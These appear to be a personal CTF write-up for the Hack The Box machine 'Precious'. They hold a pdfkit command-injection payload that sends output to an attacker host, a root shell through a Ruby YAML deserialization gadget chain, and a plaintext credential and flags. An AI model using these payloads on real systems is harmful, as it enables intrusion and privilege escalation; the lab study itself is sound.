# Precious

# Enumeration
## Nmap
SSH:    OpenSSH 8.4p1 Debian
HTTP:   nginx 1.18.0
        http://precious.htb
OS:     Linux

## Gobuster

## Web
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby

### URL checking
file:///etc/hosts -> 'You should provide a valid URL'

### RCE
POST /
url=http%3a//10.10.16.14%3a9001/shell.html$(COMMAND)
See results in server log

url=http%3a//10.10.16.14%3a9001/a$(cat$IFS$PWD/app/controllers/pdf.rb)
```ruby
class PdfControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    erb :'index'
  end

  post '/' do
    url = ERB.new(params[:url]).result(binding)
    if url =~ /^https?:\/\//i
      filename = Array.new(32){rand(36).to_s(36)}.join + '.pdf'
      path = 'pdf/' + filename

      begin
           PDFKit.new(url).to_file(path)
          cmd = `exiftool -overwrite_original -all= -creator="Generated by pdfkit v0.8.6" -xmptoolkit= 
```

url=http%3a//10.10.16.14%3a9001/a$(ls$IFS/home)
henry ruby

# Foothold
see http_serve/attack.py

# Access SSH
$ ssh ruby@10.129.103.94 -i ./ssh/ruby_rsa -v

Interesting files (linpeas):
/usr/bin/gettext.sh
/opt

Webserver files belong to root

# Henry credentials
$ cat ~/.bundle/config
henry:Q3c1AqGHtoI0aXAYFH

# User flag
henry $ cat user.txt
e8fdfab9c098de23c1c3fd9de67d2c12

# Root
/home/henry/dependencies.yml:
```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
```
$ sudo ruby /opt/update_dependencies.rb

# Root flag
root $ cat root.txt 
49606fa458927a0c3bc68a4ba831fad7
